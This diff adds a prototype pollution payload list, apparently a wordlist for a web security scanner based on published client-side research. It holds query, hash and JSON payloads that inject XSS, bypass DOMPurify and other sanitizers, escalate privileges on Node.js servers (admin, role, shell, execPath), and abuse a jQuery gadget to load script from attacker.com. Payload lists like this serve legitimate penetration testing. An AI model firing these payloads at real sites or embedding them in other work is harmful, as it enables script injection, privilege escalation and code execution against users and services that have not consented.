@@ -1,0 +1,101 @@
+# Prototype Pollution Payloads
+# Based on BlackFan's client-side-prototype-pollution research
+# Format: PAYLOAD_TYPE:payload
+
+# Basic __proto__ query parameter pollution
+QUERY:__proto__[pptest]=polluted
+QUERY:__proto__.pptest=polluted
+QUERY:__proto__[constructor][prototype][pptest]=polluted
+QUERY:constructor[prototype][pptest]=polluted
+QUERY:constructor.prototype.pptest=polluted
+
+# URL-encoded variants
+QUERY:__proto__%5Bpptest%5D=polluted
+QUERY:__proto__%2Epptest=polluted
+QUERY:constructor%5Bprototype%5D%5Bpptest%5D=polluted
+
+# Hash-based pollution
+HASH:__proto__[pptest]=polluted
+HASH:__proto__.pptest=polluted
+HASH:constructor[prototype][pptest]=polluted
+
+# Double encoding
+QUERY:%5F%5Fproto%5F%5F[pptest]=polluted
+QUERY:%5F%5Fproto%5F%5F%5Bpptest%5D=polluted
+
+# Nested object pollution
+QUERY:a[__proto__][pptest]=polluted
+QUERY:a[constructor][prototype][pptest]=polluted
+QUERY:a.__proto__.pptest=polluted
+
+# Multiple keys pollution
+QUERY:__proto__[innerHTML]=<img/src=x onerror=alert(1)>
+QUERY:__proto__[src]=data:,alert(1)//
+QUERY:__proto__[href]=javascript:alert(1)
+QUERY:__proto__[onload]=alert(1)
+QUERY:__proto__[onerror]=alert(1)
+
+# Gadget-specific payloads (for known vulnerable libraries)
+# jQuery gadgets
+QUERY:__proto__[url]=https://attacker.com/evil.js
+QUERY:__proto__[dataType]=script
+QUERY:__proto__[crossDomain]=true
+QUERY:__proto__[jsonp]=__proto__
+
+# Vue.js gadgets
+QUERY:__proto__[v]=x]<script>alert(1)</script>
+QUERY:__proto__[template]=<img src=x onerror=alert(1)>
+
+# Lodash/Underscore gadgets
+QUERY:__proto__[sourceURL]=x
+QUERY:__proto__[imports]=x
+
+# Closure library gadget
+QUERY:__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
+
+# DOMPurify bypass gadgets
+QUERY:__proto__[ALLOWED_ATTR][0]=onerror
+QUERY:__proto__[ALLOWED_ATTR][1]=onclick
+QUERY:__proto__[SAFE_FOR_TEMPLATES]=true
+
+# Sanitizer bypass gadgets
+QUERY:__proto__[whiteList][img][0]=onerror
+QUERY:__proto__[whiteList][img][1]=src
+
+# Object.assign pollution
+JSON:{"__proto__":{"pptest":"polluted"}}
+JSON:{"constructor":{"prototype":{"pptest":"polluted"}}}
+
+# Nested JSON pollution
+JSON:{"a":{"__proto__":{"pptest":"polluted"}}}
+JSON:{"a":{"constructor":{"prototype":{"pptest":"polluted"}}}}
+
+# Array-based pollution
+QUERY:__proto__[0]=polluted
+QUERY:__proto__[length]=100
+
+# Node.js/Server-side pollution (for APIs)
+JSON:{"__proto__":{"admin":true}}
+JSON:{"__proto__":{"isAdmin":true}}
+JSON:{"__proto__":{"role":"admin"}}
+JSON:{"__proto__":{"shell":"/bin/sh"}}
+JSON:{"__proto__":{"execPath":"calc.exe"}}
+
+# Property descriptor pollution
+QUERY:__proto__[__defineGetter__]=x
+QUERY:__proto__[__defineSetter__]=x
+QUERY:__proto__[__lookupGetter__]=x
+
+# Prototype chain traversal
+QUERY:__proto__.__proto__[pptest]=polluted
+QUERY:constructor.constructor.prototype[pptest]=polluted
+
+# Window/global pollution
+QUERY:__proto__[window]=polluted
+QUERY:__proto__[global]=polluted
+QUERY:__proto__[self]=polluted
+
+# Common exploitable properties
+QUERY:__proto__[toString]=function(){return 'pwned'}
+QUERY:__proto__[valueOf]=function(){return 1}
+QUERY:__proto__[hasOwnProperty]=false
